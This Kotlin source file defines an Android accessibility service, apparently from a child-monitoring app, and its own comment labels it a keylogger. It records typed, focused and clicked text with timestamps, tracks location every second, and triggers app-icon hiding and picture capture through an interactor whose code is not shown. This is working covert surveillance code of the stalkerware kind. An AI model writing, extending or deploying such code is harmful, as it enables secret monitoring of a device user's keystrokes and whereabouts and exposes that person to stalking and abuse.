package com.github.midros.child.services.accessibilityData

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.support.v4.app.ActivityCompat
import android.view.accessibility.AccessibilityEvent
import com.github.midros.child.app.ChildApp
import com.github.midros.child.utils.ConstFun.getDateTime
import com.github.midros.child.utils.Consts.TAG
import com.pawegio.kandroid.i
import javax.inject.Inject


/**
 * Created by luis rafael on 17/03/18.
 */
class AccessibilityDataService : AccessibilityService(), LocationListener {

    @Inject
    lateinit var interactor: InteractorAccessibilityData

    private lateinit var locationManager: LocationManager

    override fun onCreate() {
        super.onCreate()
        ChildApp.appComponent.inject(this)
        getLocation()
        interactor.getShowOrHideApp()
        interactor.getCapturePicture()
    }

    override fun onInterrupt() {}

    //keylogger
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val data = event.text.toString()
                if (data != "[]") {
                    interactor.setDataKey("${getDateTime()} |(TEXT)| $data")
                    i(TAG, "${getDateTime()} |(TEXT)| $data")
                }
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                val data = event.text.toString()
                if (data != "[]") {
                    interactor.setDataKey("${getDateTime()} |(FOCUSED)| $data")
                    i(TAG, "${getDateTime()} |(FOCUSED)| $data")
                }
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val data = event.text.toString()
                if (data != "[]") {
                    interactor.setDataKey("${getDateTime()} |(CLICKED)| $data")
                    i(TAG, "${getDateTime()} |(CLICKED)| $data")
                }
            }
        }

    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        interactor.setRunServiceData(true)
        interactor.getSocialStatus()
    }

    override fun onDestroy() {
        interactor.setRunServiceData(false)
        interactor.clearDisposable()
        super.onDestroy()
    }


    //location
    private fun getLocation() {
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            interactor.enablePermissionLocation(true)
            locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 1000, 0f, this)
        } else interactor.enablePermissionLocation(false)
    }

    override fun onLocationChanged(location: Location) = interactor.setDataLocation(location)

    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}

    override fun onProviderEnabled(provider: String?) {
        if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) interactor.enableGps(true)
    }

    override fun onProviderDisabled(provider: String?) {
        if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) interactor.enableGps(false)
    }

}